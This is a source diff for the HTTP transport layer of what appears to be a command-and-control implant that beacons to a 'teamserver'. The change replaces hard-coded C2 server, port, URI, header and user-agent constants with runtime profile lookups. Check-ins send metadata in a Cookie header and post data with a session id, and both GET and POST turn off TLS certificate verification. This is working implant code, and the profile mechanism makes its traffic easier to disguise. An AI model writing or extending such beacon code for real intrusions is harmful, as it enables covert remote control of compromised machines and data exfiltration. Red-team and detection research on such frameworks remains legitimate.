@@ -1,6 +1,6 @@
 #include "http.h"
 #include "crypto.h"
-#include "config.h"
+#include "profile.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -44,15 +44,16 @@ int http_get(const char *uri,
     }
 
     // Build full URL
+    const char *resolved_uri = uri ? uri : profile_get_http_get_uri();
     char url[512];
-    #if C2_USE_HTTPS == 0
-    snprintf(url, sizeof(url), "http://%s:%d%s", C2_SERVER, C2_PORT, uri);
-    #else
-    snprintf(url, sizeof(url), "https://%s:%d%s", C2_SERVER, C2_PORT, uri);
-    // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    #endif
+    if (profile_get_use_https()) {
+        snprintf(url, sizeof(url), "https://%s:%d%s", profile_get_server(), profile_get_port(), resolved_uri);
+        // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    } else {
+        snprintf(url, sizeof(url), "http://%s:%d%s", profile_get_server(), profile_get_port(), resolved_uri);
+    }
 
     //DEBUG_PRINT("GET URL: %s\n", url);
     //DEBUG_PRINT("Metadata length: %zu bytes\n", metadata_len);
@@ -60,14 +61,19 @@ int http_get(const char *uri,
     // Setup headers
     struct curl_slist *headers = NULL;
 
-    // Static headers
-    headers = curl_slist_append(headers, HTTP_ACCEPT_HEADER);
-    headers = curl_slist_append(headers, HTTP_CONNECTION_HEADER);
-    headers = curl_slist_append(headers, HTTP_CACHE_CONTROL_HEADER);
+    // Profile-defined static headers
+    size_t header_count = profile_get_header_count();
+    size_t header_idx = 0;
+    for (header_idx = 0; header_idx < header_count; ++header_idx) {
+        const char *profile_header = profile_get_header(header_idx);
+        if (profile_header && profile_header[0] != '\0') {
+            headers = curl_slist_append(headers, profile_header);
+        }
+    }
 
     // User-Agent
     char ua_header[512];
-    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", USER_AGENT);
+    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", profile_get_user_agent());
     headers = curl_slist_append(headers, ua_header);
 
     // Cookie header (only if metadata present)
@@ -147,15 +153,16 @@ int http_post(const char *uri, const uint8_t *data, size_t data_len,
     }
     
     // Build full URL with session ID parameter
+    const char *resolved_uri = uri ? uri : profile_get_http_post_uri();
     char url[512];
-    #if C2_USE_HTTPS == 0
-    snprintf(url, sizeof(url), "http://%s:%d%s?id=%s", C2_SERVER, C2_PORT, uri, session_id);
-    #else
-    snprintf(url, sizeof(url), "https://%s:%d%s?id=%s", C2_SERVER, C2_PORT, uri, session_id);
-    // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    #endif
+    if (profile_get_use_https()) {
+        snprintf(url, sizeof(url), "https://%s:%d%s?id=%s", profile_get_server(), profile_get_port(), resolved_uri, session_id);
+        // The following two options are needed to support teamserver with untrusted (such as self-signed) certificates
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    } else {
+        snprintf(url, sizeof(url), "http://%s:%d%s?id=%s", profile_get_server(), profile_get_port(), resolved_uri, session_id);
+    }
     
     DEBUG_PRINT("POST URL: %s\n", url);
     DEBUG_PRINT("POST data length: %zu bytes\n", data_len);
@@ -165,7 +172,7 @@ int http_post(const char *uri, const uint8_t *data, size_t data_len,
     headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
     
     char ua_header[512];
-    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", USER_AGENT);
+    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", profile_get_user_agent());
     headers = curl_slist_append(headers, ua_header);
     
     // Configure CURL
